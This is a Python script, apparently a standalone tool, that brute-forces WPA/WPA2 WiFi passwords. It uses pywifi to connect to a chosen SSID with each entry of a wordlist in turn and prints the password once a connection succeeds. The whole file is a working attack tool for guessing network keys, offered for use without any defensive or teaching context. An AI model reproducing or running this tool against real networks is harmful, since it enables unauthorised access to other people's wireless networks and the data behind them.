import argparse
import os
import platform
import sys
import time
from pywifi import PyWiFi, const, Profile

# Terminal color definitions
RED = "\033[1;31m"
GREEN = "\033[0;32m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
RESET = "\033[0;0m"


def clear_screen():
    """Clears the terminal screen."""
    os.system("cls" if os.name == "nt" else "clear")


def connect_wifi(ssid, password):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(0.5)  # Adjust this sleep time if necessary

    if iface.status() == const.IFACE_CONNECTED:
        print(GREEN + '[*] Crack success!' + RESET)
        print(GREEN + '[*] Password is: {}'.format(password) + RESET)
        return True
    return False


def try_passwords(ssid, file_path):
    if not os.path.exists(file_path):
        print(RED + "[-] No such file: " + file_path + RESET)
        return

    with open(file_path, 'r', encoding='utf-8') as file:
        for number, password in enumerate(file, start=1):
            password = password.strip()
            print(f"[*] Trying password {number}: {password}")
            if connect_wifi(ssid, password):
                exit()


def parse_arguments():
    parser = argparse.ArgumentParser(description="WiFi WPA/WPA2 brute force tool")

    # Instead of making arguments required, we'll check and ask for them later if not provided
    parser.add_argument('-s', '--ssid', help='SSID = WiFi Name')
    parser.add_argument('-w', '--wordlist', help='Path to password list file')

    args = parser.parse_args()

    # Prompt for SSID if not provided
    if not args.ssid:
        args.ssid = input("Enter SSID (WiFi Name): ")

    # Prompt for wordlist path if not provided
    if not args.wordlist:
        args.wordlist = input("Enter path to password list file: ")

    return args


def main():
    args = parse_arguments()

    # Improved system and architecture display
    print(CYAN + f"[+] Operating System: {platform.system()} - Architecture: {platform.machine()}" + RESET)
    time.sleep(1)

    clear_screen()  # Use the new clear_screen function for cross-platform compatibility
    print(BLUE + f"[*] Starting crack on SSID: {args.ssid}" + RESET)
    try_passwords(args.ssid, args.wordlist)


if __name__ == "__main__":
    main()
